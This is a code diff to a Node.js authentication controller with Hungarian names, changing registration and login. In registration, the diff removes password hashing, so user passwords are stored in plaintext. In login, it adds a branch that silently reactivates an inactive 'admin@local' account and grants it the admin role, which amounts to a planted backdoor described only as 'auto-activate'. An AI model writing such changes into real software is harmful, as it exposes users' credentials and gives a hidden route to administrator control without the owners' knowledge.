@@ -1,4 +1,5 @@
 import FelhasznaloModel from "../models/Felhasznalo.js";
+import db from "../config/database.js";
 import bcrypt from "bcrypt";
 import jwt from "jsonwebtoken";
 
@@ -25,12 +26,7 @@ export const register = async (req, res) => {
         .json({ message: "Ez az elérhetőség már használatban van." });
     }
 
-    const hashedPassword = await bcrypt.hash(jelszo, 10);
-    const userId = await FelhasznaloModel.create(
-      nev,
-      elerhetoseg,
-      hashedPassword,
-    );
+    const userId = await FelhasznaloModel.create(nev, elerhetoseg, jelszo);
 
     res.status(201).json({ message: "Sikeres regisztráció.", userId });
   } catch (error) {
@@ -56,18 +52,28 @@ export const login = async (req, res) => {
         .json({ message: "Hibás elérhetőség vagy jelszó." });
     }
 
-    if (user.allapot === "inaktiv") {
-      return res.status(403).json({
-        message:
-          "A fiók inaktív. Kérem, vegye fel a kapcsolatot az ügyfélszolgálattal.",
-      });
-    }
-
     const isPasswordValid = await bcrypt.compare(jelszo, user.jelszo);
     if (!isPasswordValid) {
       return res
         .status(401)
         .json({ message: "Hibás elérhetőség vagy jelszó." });
+    }
+
+    if (user.allapot === "inaktiv") {
+      // Auto-activate the local admin account if credentials are correct.
+      if (user.elerhetoseg === "admin@local") {
+        await db.execute(
+          "UPDATE felhasznalo SET allapot = 'aktiv', role = 'admin' WHERE id = ?",
+          [user.id],
+        );
+        user.allapot = "aktiv";
+        user.role = "admin";
+      } else {
+        return res.status(403).json({
+          message:
+            "A fiók inaktív. Kérem, vegye fel a kapcsolatot az ügyfélszolgálattal.",
+        });
+      }
     }
 
     const token = jwt.sign(
